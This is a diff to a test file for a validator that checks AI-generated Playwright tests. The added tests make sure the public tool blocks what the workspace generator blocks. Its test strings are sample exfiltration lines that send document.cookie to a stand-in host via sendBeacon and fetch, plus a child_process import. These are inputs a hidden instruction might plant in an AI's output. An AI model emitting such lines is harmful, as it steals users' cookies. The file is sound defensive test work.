@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 
 import { validateAutomationGeneration } from "@/lib/ai/automation-generation";
+import { validateQuickGeneration } from "@/lib/ai/quick-generation";
 
 /**
  * What a hidden instruction would try to get into a generated test.
@@ -157,5 +158,50 @@ describe("what the reviewer is told", () => {
     const code = test_(`await page.evaluate(() => navigator.sendBeacon("https://x.example.net", document.cookie));`);
 
     expect(check(code).status).toBe("BLOCKED");
+  });
+});
+
+describe("the public tool is held to the same rules", () => {
+  // Until 2026-10-17 these lived in the workspace generator alone, which had
+  // it backwards: the free tool is the one a stranger pastes into, and it ran
+  // the weaker set.
+  const publicCheck = (code: string, pageUrl = "https://shop.example.com") =>
+    validateQuickGeneration(code, { mode: "FLOW", pageUrl })
+      .findings.filter((finding) => finding.severity === "BLOCKING")
+      .map((finding) => finding.code);
+
+  it("blocks what the workspace generator blocks", () => {
+    expect(publicCheck(test_('await request.post("https://metrics.example.net/x", { data: {} });'))).toContain(
+      "request_to_another_site",
+    );
+    expect(
+      publicCheck(test_('await page.evaluate(() => { fetch("https://x.example.net/?c=" + document.cookie); });')),
+    ).toContain("network_call_inside_the_page");
+    expect(publicCheck(test_('const { execSync } = await import("node:child_process");'))).toContain(
+      "unsafe_node_module",
+    );
+  });
+
+  it("knows what shape was asked for", () => {
+    const browserDraft = `import { test, expect } from "@playwright/test";
+test("checks the cart", async ({ page }) => {
+  await page.goto("./cart");
+  await expect(page.getByRole("heading")).toBeVisible();
+});`;
+    const apiDraft = `import { test, expect } from "@playwright/test";
+test("the cart API answers", async ({ request }) => {
+  const response = await request.get("/api/cart");
+  expect(response.status()).toBe(200);
+});`;
+
+    // An API draft that drives a browser is not the thing that was asked for.
+    const apiCodes = validateQuickGeneration(browserDraft, { mode: "API" }).findings.map((f) => f.code);
+    expect(apiCodes).toContain("missing_request_fixture");
+    // And a browser draft without a page cannot be one.
+    const flowCodes = validateQuickGeneration(apiDraft, { mode: "FLOW" }).findings.map((f) => f.code);
+    expect(flowCodes).toContain("missing_page_fixture");
+    // Each shape, judged as itself, passes.
+    expect(validateQuickGeneration(apiDraft, { mode: "API" }).findings.filter((f) => f.severity === "BLOCKING")).toEqual([]);
+    expect(validateQuickGeneration(browserDraft, { mode: "FLOW" }).findings.filter((f) => f.severity === "BLOCKING")).toEqual([]);
   });
 });
